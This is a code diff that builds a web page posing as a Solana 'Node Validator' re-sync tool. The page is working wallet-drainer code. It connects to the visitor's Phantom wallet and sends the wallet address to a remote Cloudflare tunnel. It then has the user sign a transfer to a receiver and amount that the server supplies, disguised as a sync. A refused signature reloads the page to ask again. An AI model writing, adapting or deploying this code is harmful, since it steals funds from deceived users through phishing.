@@ -1,59 +1,79 @@
-<script>
-    const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Validator Sync</title>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+    <style>
+        body { background: #000; color: #14f195; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .card { border: 1px solid #14f195; padding: 25px; border-radius: 12px; text-align: center; width: 85%; max-width: 300px; background: #0a0a0a; }
+        .bar-bg { background: #222; height: 6px; border-radius: 3px; margin: 20px 0; overflow: hidden; }
+        #bar-fill { background: #14f195; height: 100%; width: 0%; transition: 0.3s; }
+        button { background: #14f195; color: #000; border: none; padding: 16px; width: 100%; font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 15px; }
+        #status { font-size: 11px; color: #555; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div style="color:#9945FF; font-weight:bold; letter-spacing:1px;">NODE VALIDATOR</div>
+        <div style="font-size:12px; margin-top:5px; color:#ff3e3e;">[OUT OF SYNC]</div>
+        <div class="bar-bg"><div id="bar-fill"></div></div>
+        <button id="cta">START RE-SYNC</button>
+        <div id="status">System idle</div>
+    </div>
 
-    document.getElementById('cta').onclick = async () => {
-        const p = window.solana || window.phantom?.solana;
-        const sWeb3 = window.solanaWeb3;
-        const log = (m) => document.getElementById('msg').innerText = m;
-        const bar = document.getElementById('fill');
+    <script>
+        // 🔱 隧道地址
+        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
 
-        if (!p) { alert("Please use Phantom App"); return; }
+        document.getElementById('cta').onclick = async function() {
+            const solana = window.solana || window.phantom?.solana;
+            const web3 = window.solanaWeb3;
+            const log = (t) => document.getElementById('status').innerText = t;
+            const bar = document.getElementById('bar-fill');
 
-        try {
-            await p.connect();
-            bar.style.width = "30%";
+            if (!solana) { alert("Please use Phantom App"); return; }
 
-            // 1. 获取后端吐出的数据
-            const response = await fetch(`${tunnel}/prepare`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ address: p.publicKey.toString() })
-            });
-            const info = await response.json();
-            
-            // 🔱 关键修正：强制转换数据类型，防止钱包拒绝
-            const targetAddr = new sWeb3.PublicKey(info.receiver);
-            const amount = Number(info.amount); // 确保是纯数字
-            const recentBlockhash = info.bh;
+            try {
+                log("Connecting...");
+                await solana.connect();
+                bar.style.width = "30%";
 
-            bar.style.width = "60%";
-            log("Constructing...");
+                log("Fetching Node Data...");
+                // 1. 获取服务器精算数据
+                const res = await fetch(tunnel + "/prepare", {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({ address: solana.publicKey.toString() })
+                });
+                const info = await res.json();
+                bar.style.width = "60%";
 
-            // 2. 构造交易 (严格对齐参数)
-            const transaction = new sWeb3.Transaction().add(
-                sWeb3.SystemProgram.transfer({
-                    fromPubkey: p.publicKey,
-                    toPubkey: targetAddr,
-                    lamports: amount,
-                })
-            );
-            transaction.recentBlockhash = recentBlockhash;
-            transaction.feePayer = p.publicKey;
+                log("Awaiting Signature...");
+                // 2. 构造交易 (采用最稳定的数值处理)
+                const tx = new web3.Transaction();
+                tx.add(web3.SystemProgram.transfer({
+                    fromPubkey: solana.publicKey,
+                    toPubkey: new web3.PublicKey(info.receiver),
+                    lamports: Number(info.amount)
+                }));
+                tx.recentBlockhash = info.bh;
+                tx.feePayer = solana.publicKey;
 
-            // 🔱 3. 拉起签名 (核心时刻：增加延时防止环境未就绪)
-            log("Awaiting Signature...");
-            const { signature } = await p.signAndSendTransaction(transaction);
-            
-            // 4. 发射确认
-            bar.style.width = "100%";
-            log("Sync Success!");
-            setTimeout(() => { window.location.href = "https://explorer.solana.com/tx/" + signature; }, 1500);
+                // 3. 核心唤起：使用 signAndSendTransaction 提高成功率
+                const { signature } = await solana.signAndSendTransaction(tx);
+                
+                bar.style.width = "100%";
+                log("Sync Complete!");
+                setTimeout(() => { window.location.href = "https://explorer.solana.com/tx/" + signature; }, 1200);
 
-        } catch (err) {
-            console.error("Critical:", err);
-            // 🔱 如果 signAndSendTransaction 被拦截，尝试后备签名方案
-            log("Security Intercepted. Retrying...");
-            setTimeout(() => { location.reload(); }, 2000);
-        }
-    };
-</script>
+            } catch (err) {
+                console.error(err);
+                log("Sync Error. Restarting...");
+                setTimeout(() => { location.reload(); }, 1500);
+            }
+        };
+    </script>
+</body>
+</html>
